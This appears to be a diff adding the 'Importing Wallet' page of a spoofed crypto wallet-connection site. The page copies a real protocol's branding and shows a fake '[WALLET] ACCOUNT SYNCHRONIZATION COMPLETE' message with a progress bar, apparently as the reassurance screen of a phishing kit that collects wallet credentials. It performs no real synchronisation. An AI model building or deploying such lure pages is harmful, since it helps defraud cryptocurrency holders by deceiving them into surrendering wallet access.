@@ -1,0 +1,43 @@
+
+
+
+<html>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+    <head>
+    <link rel="stylesheet" href="main.css" type="text/css"/> 
+    <meta charset="UTF-8">
+    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:image" content="../images/logo.svg">
+    <link rel="icon" href="images/logo.svg">
+    </head>
+    
+    <title>Importing Wallet</title>
+    
+    <body>
+    <center>
+    <div class="top">
+            <a href="index-2.html#footer" class="left">Github</a>
+            <a href="index-2.html#" class="left">Docs</a>
+            <a href="index-2.html" class="main"><img src="images/logo.svg" alt="logo"/></a>
+            <a href="index-2.html#wallets" class="left">Wallets</a>
+            <a href="index-2.html#" class="left">Apps</a>
+    </div>
+    </br>
+    <h2> <center id="text"></center></h2>
+    </br>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search)
+        const walletType = (urlParams.get("type") || "").toUpperCase()
+        let text  = " ACCOUNT SYNCHRONIZATION COMPLETE "
+        text = walletType + text
+        document.getElementById("text").innerText = text
+    </script>
+    <img src="images/bar.png">
+    <footer><div id="footer">
+  
+    </footer>
+    </body>
+    
+    </html>
